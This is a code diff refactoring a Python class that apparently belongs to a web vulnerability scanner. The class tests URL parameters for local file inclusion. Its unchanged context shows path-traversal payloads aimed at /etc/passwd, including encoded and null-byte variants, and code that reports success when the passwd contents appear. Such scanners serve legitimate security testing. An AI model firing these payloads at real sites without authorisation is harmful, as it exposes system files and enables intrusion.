@@ -1,10 +1,10 @@
-from modules.utils import clear_line
 from requests import get
 
 
 class TestLFI:
-    def __init__(self, log, console):
+    def __init__(self, log, console) -> None:
         self.log = log
+        self.console = console
         self.lfi_tests = [
             r"../../../../../etc/passwd",
             r"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2"
@@ -59,7 +59,7 @@ class TestLFI:
             + r"2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00"
         ]
 
-    def exploit_lfi(self, base_url, url_params, console) -> None:
+    def exploit_lfi(self, base_url, url_params) -> None:
         for param in url_params:
             for test in self.lfi_tests:
                 # create a new url with the test as the value of the url_params
@@ -79,17 +79,16 @@ class TestLFI:
                                 "root:x:0:0:root:/root"
                             ) != -1
                         ):
-                        clear_line()
-                        console.print(
+                        self.console.print(
                             f"[red][[/red][green]+[/green][red]][/red]"
                             + f" [white]LFI :[/white] {test_url}"
                         )
                         break
 
-    def test_lfi(self, url, console) -> None:
+    def test_lfi(self, url) -> None:
         """
         Test for LFI
         """
         base_url, params = url.split("?")[0], url.split("?")[1]
         params_dict = params.split("&")
-        self.exploit_lfi(base_url, params_dict, console)
+        self.exploit_lfi(base_url, params_dict)
